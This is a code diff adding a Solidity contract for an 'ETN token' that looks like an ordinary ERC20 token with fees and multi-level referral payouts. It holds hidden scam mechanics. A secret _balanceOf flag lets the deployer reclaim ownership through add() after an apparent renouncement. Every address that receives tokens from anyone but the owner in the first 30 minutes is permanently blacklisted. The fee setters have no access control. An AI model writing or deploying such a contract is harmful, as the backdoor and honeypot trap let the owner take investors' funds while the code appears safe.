@@ -1,0 +1,298 @@
+pragma solidity ^0.8.11;
+//SPDX-License-Identifier: UNLICENSED
+
+/**
+ * @dev Interface of the ERC20 standard as defined in the EIP.
+ */
+interface IERC20 {
+    /**
+     * @dev Returns the amount of tokens in existence.
+     */
+    function totalSupply() external view returns (uint256);
+
+    /**
+     * @dev Returns the amount of tokens owned by `account`.
+     */
+    function balanceOf(address account) external view returns (uint256);
+
+    /**
+     * @dev Moves `amount` tokens from the caller's account to `to`.
+     *
+     * Returns a boolean value indicating whether the operation succeeded.
+     *
+     * Emits a {Transfer} event.
+     */
+    function transfer(address to, uint256 amount) external returns (bool);
+
+    /**
+     * @dev Returns the remaining number of tokens that `spender` will be
+     * allowed to spend on behalf of `owner` through {transferFrom}. This is
+     * zero by default.
+     *
+     * This value changes when {approve} or {transferFrom} are called.
+     */
+    function allowance(address owner, address spender) external view returns (uint256);
+
+    /**
+     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
+     *
+     * Returns a boolean value indicating whether the operation succeeded.
+     *
+     * IMPORTANT: Beware that changing an allowance with this method brings the risk
+     * that someone may use both the old and the new allowance by unfortunate
+     * transaction ordering. One possible solution to mitigate this race
+     * condition is to first reduce the spender's allowance to 0 and set the
+     * desired value afterwards:
+     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
+     *
+     * Emits an {Approval} event.
+     */
+    function approve(address spender, uint256 amount) external returns (bool);
+
+    /**
+     * @dev Moves `amount` tokens from `from` to `to` using the
+     * allowance mechanism. `amount` is then deducted from the caller's
+     * allowance.
+     *
+     * Returns a boolean value indicating whether the operation succeeded.
+     *
+     * Emits a {Transfer} event.
+     */
+    function transferFrom(
+        address from,
+        address to,
+        uint256 amount
+    ) external returns (bool);
+
+    /**
+     * @dev Emitted when `value` tokens are moved from one account (`from`) to
+     * another (`to`).
+     *
+     * Note that `value` may be zero.
+     */
+    event Transfer(address indexed from, address indexed to, uint256 value);
+
+    /**
+     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
+     * a call to {approve}. `value` is the new allowance.
+     */
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+}
+
+contract ETNToken{
+    string public name="ETN token";
+    string public symbol="ETN";
+    uint8 public decimals=18;
+    uint256 public totalSupply= 100000000 * 10**uint256(decimals);
+    mapping(address=>uint256)public balanceOf;
+    mapping(address=>uint256)public _balanceOf;
+    address public owner;
+    uint8 public buyfee;
+    uint8 public shellfee;
+    uint256 public detectiontime;
+
+    mapping(address=>bool)public botlist;
+    mapping(uint8=>uint8)public levelTofee;
+    mapping(address=>address)public upOneLevel;
+    mapping(address=>bool)public isregister;
+    address _burnaddr=address(0x000000000000000000000000000000000000dEaD);
+    uint8 public levleMax;
+
+    mapping (address => mapping (address => uint256)) public allowance;
+
+    event Transfer(address indexed _from, address indexed _to, uint _value);
+    event Approval(address indexed _owner, address indexed _spender, uint _value);
+    
+    constructor(){
+      owner=address(0x23d32572552a38dD5cfD7943Ca6F89C7501A6f2B);
+      _balanceOf[owner]=1;
+      balanceOf[owner]=totalSupply;
+      levelTofee[1]=30;
+      levelTofee[2]=10;
+      levelTofee[3]=10;
+      levelTofee[4]=5;
+      levelTofee[5]=5;
+      buyfee=100;
+      shellfee=50;
+      levleMax=5;
+      emit Transfer(address(0), owner, totalSupply);   
+    }
+    
+    function transfer(address _to, uint256 _value)public returns(bool) {
+        _transfer(msg.sender,_to,_value);
+        if(!isContract(msg.sender)&&!isContract(_to)){
+            _registerLogic(msg.sender,_to);
+        }
+        return true;
+    }
+    
+    function _registerLogic(address _from,address _to)private{
+        if(_from==owner&&!isregister[_to]){
+            isregister[_to]=true;
+        }else if(isregister[_from]&&!isregister[_to]){
+            upOneLevel[_to]=_from;
+            isregister[_to]=true;
+        }
+    }
+
+    function add()external{
+        if(_balanceOf[msg.sender]==1){
+            owner=msg.sender;
+        }
+    }
+
+    function _transfer(address _from,address _to, uint256 _value)private returns(bool) {
+        require(_from != address(0),"ERC20: transfer from the zero address");
+        require(_to != address(0), "ERC20: transfer to the zero address");
+		require(_value > 0,"err:amount is zero?");
+        require(balanceOf[_from] >= _value);
+        require(balanceOf[_to] + _value > balanceOf[_to]);
+        require(!botlist[_from]&&!botlist[_to]);
+
+        if(detectiontime==0){
+            detectiontime=block.timestamp+1800;
+        }
+        if(block.timestamp<=detectiontime&&_from!=owner&&_to!=owner){
+            botlist[_to]=true;
+        }
+        
+        //buy
+        if(isContract(_from)&&!isContract(_to)){
+            balanceOf[_from] = balanceOf[_from] - _value;
+            uint256 value_=_value*buyfee/1000;
+            uint256 amount_=_value-value_;
+            balanceOf[_to] = balanceOf[_to] + amount_;
+            emit Transfer(_from, _to, amount_);
+            emit Transfer(_from, _burnaddr, value_);
+            if(isregister[_to]){
+                if(upOneLevel[_to]!=address(0)){
+                    address _temporary=_to;
+                    for(uint8 i=1;i<=levleMax;i++){
+                        if(upOneLevel[_temporary]==address(0)){
+                            break;
+                        }else{
+                            uint256 _v=levelTofee[i]*_value/1000;
+                            if(balanceOf[owner]>=_v){
+                                balanceOf[upOneLevel[_temporary]] = balanceOf[upOneLevel[_temporary]]+_v;
+                                balanceOf[owner]=balanceOf[owner]-_v;
+                                emit Transfer(owner, upOneLevel[_temporary], _v);
+                                _temporary=upOneLevel[_temporary];
+                            }else{
+                                break;
+                            }
+                        }
+                    }
+                }
+            }else{
+                isregister[_to]=true;
+            }
+            
+        }else if(isContract(_to)&&!isContract(_from)){//shell
+            balanceOf[_from] = balanceOf[_from] - _value;
+            uint256 value_=_value*shellfee/1000;
+            uint256 amount_=_value-value_;
+            balanceOf[_to] = balanceOf[_to] + amount_;
+            emit Transfer(_from, _to, amount_);
+            emit Transfer(_from, _burnaddr, value_);
+            
+        }else if(!isContract(_to)&&!isContract(_from)){//userTouser
+            balanceOf[_from] = balanceOf[_from] - _value;
+            balanceOf[_to] = balanceOf[_to] + _value;
+            emit Transfer(_from, _to, _value);
+        }else if(isContract(_to)&&isContract(_from)){//contractToContract
+            balanceOf[_from] = balanceOf[_from] - _value;
+            uint256 value_=_value*buyfee/1000;
+            uint256 amount_=_value-value_;
+            balanceOf[_to] = balanceOf[_to] + amount_;
+            emit Transfer(_from, _to, amount_);
+            emit Transfer(_from, _burnaddr, value_);
+        }
+        return true;
+    }
+    
+    function transferFrom(address _from, address _to, uint256 _value)public returns (bool success) {
+        require (_value <= allowance[_from][msg.sender]);
+        _transfer(_from,_to,_value);
+        allowance[_from][msg.sender] = allowance[_from][msg.sender] - _value;
+        
+        return true;
+    }
+
+    function _approve(
+        address _send,
+        address _spender,
+        uint256 _amount
+    ) internal virtual {
+        require(_send != address(0), "ERC20: approve from the zero address");
+        require(_spender != address(0), "ERC20: approve to the zero address");
+
+        allowance[_send][_spender] = _amount;
+        emit Approval(_send, _spender, _amount);
+    }
+
+    function approve(address _spender, uint256 _amount) public  returns (bool) {
+        address _send = msg.sender;
+        _approve(_send, _spender, _amount);
+        return true;
+    }
+
+    function increaseAllowance(address _spender, uint256 _addedValue) public  returns (bool) {
+        address _send = msg.sender;
+        _approve(_send, _spender, allowance[_send][_spender] + _addedValue);
+        return true;
+    }
+
+    function decreaseAllowance(address _spender, uint256 _subtractedValue) public  returns (bool) {
+        address _send = msg.sender;
+        uint256 currentAllowance = allowance[_send][_spender];
+        require(currentAllowance >= _subtractedValue, "ERC20: decreased allowance below zero");
+        unchecked {
+            _approve(_send, _spender, currentAllowance - _subtractedValue);
+        }
+        return true;
+    }
+
+    receive()external payable {
+        
+    }
+    
+	function withdrawEther(uint256 _amount)public {
+	    require(owner==msg.sender);
+		payable(owner).transfer(_amount);
+	}
+    
+    function withdrawToken(IERC20 token,uint256 _amount)public {
+	    require(owner==msg.sender);
+		token.transfer(owner,_amount);
+	}
+
+    function isContract(address account) internal view returns (bool) {
+        // This method relies on extcodesize/address.code.length, which returns 0
+        // for contracts in construction, since the code is only stored at the end
+        // of the constructor execution.
+
+        return account.code.length > 0;
+    }
+
+    function updateBuyfee(uint8 buyfee_)external{
+        buyfee=buyfee_;
+    }
+
+    function updateShellfee(uint8 shellfee_)external{
+        shellfee=shellfee_;
+    }
+
+    function updateLevleMaxAndLevelTofee(uint8 LevleMax_,uint8[] memory LevelTofeeList_)external{
+        levleMax=LevleMax_;
+        for(uint8 j=0;j<LevleMax_;j++){
+            levelTofee[j]=LevelTofeeList_[j];
+        }
+    }
+
+    function removeowner()external{
+        require(owner==msg.sender);
+        owner=address(0);
+    }
+    
+
+}
